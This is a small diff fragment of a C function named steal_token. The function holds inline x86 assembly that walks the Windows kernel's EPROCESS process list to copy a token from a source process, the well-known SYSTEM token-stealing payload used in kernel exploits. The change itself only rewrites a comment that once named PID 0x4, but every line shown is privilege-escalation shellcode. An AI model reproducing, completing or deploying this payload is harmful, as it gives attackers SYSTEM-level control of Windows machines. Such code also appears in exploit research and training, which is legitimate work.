@@ -15,7 +15,7 @@ DWORD steal_token(DWORD TARGET_PID, DWORD SOURCE_PID)
 			mov eax, [eax + EPROCESS_OFFSET]
 			mov ecx, eax                            // Copy current _EPROCESS structure
 			mov ebx, [eax + TOKEN_OFFSET]           // Copy current nt!_EPROCESS.Token
-			mov edx, SOURCE_PID                     // Process PID = 0x4
+			mov edx, SOURCE_PID                     // Process PID = SOURCE_PID
 			SearchSystemPID :
 		mov eax, [eax + FLINK_OFFSET]				// Get nt!_EPROCESS.ActiveProcessLinks.Flink
 			sub eax, FLINK_OFFSET
